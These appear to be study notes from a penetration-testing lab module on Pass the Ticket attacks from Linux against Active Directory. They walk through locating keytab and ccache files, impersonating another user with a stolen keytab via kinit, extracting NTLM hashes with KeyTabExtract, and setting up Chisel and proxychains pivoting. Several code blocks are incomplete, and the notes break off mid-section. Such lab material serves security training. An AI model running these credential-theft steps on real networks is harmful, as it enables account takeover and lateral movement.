# Pass the Ticket (PtT) from Linux

## Identifying Linux and Active Directory Integration

### realm - Check If Linux Machine is Domain Joined
>We can identify if the Linux machine is domain join using realm, a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.
```bash
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

>The output of the command indicates that the machine is configured as a Kerberos member. It also gives us information about the domain name (inlanefreight.htb) and which users and groups are permitted to log in, which in this case are the users David and Julio and the group Linux Admins.

### PS - Check if Linux Machine is Domain Joined
```bash
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files

## Finding Kerberos Tickets in Linux

>Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings

## Finding Keytab Files

>A straightforward approach is to use find to search for files whose name contains the word keytab. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to .keytab. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.

### Using Find to Search for Files with Keytab in the Name
```bash
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

<SNIP>

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```
**Note: To use a keytab file, we must have read and write (rw) privileges on the file.**

### Identifying Keytab Files in Cronjobs
```bash
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```
## Finding ccache Files

>A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data.
### Reviewing Environment Variables for ccache Files.
```bash
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

### Searching for ccache Files in /tmp
```bash
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..

```

## Abusing KeyTab Files

>As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using kinit. To use a keytab file, we need to know which user it was created for. klist is another application used to interact with Kerberos on Linux. This application reads information from a keytab file.

### Listing keytab File Information
```bash
david@inlanefreight.htb@linux01:~$ klist -k -t 

/opt/specialfiles/carlos.keytab 
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```
**Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.**

### Impersonating a User with a keytab
```bash
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal

david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

### Connecting to SMB Share as User
```bash
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

## Keytab Extract

> Another method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

>We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use KeyTabExtract, a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.

### Extracting Keytab Hashes with KeyTabExtract
```bash
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.

## Using Linux Attack Tools with Kerberos

>Most Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our KRB5CCNAME environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

### Host File Modified
**In this scenario, our attack host doesn't have a connection to the KDC/Domain Controller, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via MS01 with a tool such as Chisel and Proxychains and edit the /etc/hosts file to hardcode IP addresses of the domain and the machines we want to attack.**
```bash
Attacker@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```
>We need to modify our proxychains configuration file to use socks5 and port 1080.

### Proxychains Configuration File
```bash
Attacker@htb[/htb]$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```
>We must download and execute chisel on our attack host.

### Download Chisel to our Attack Host
```bash
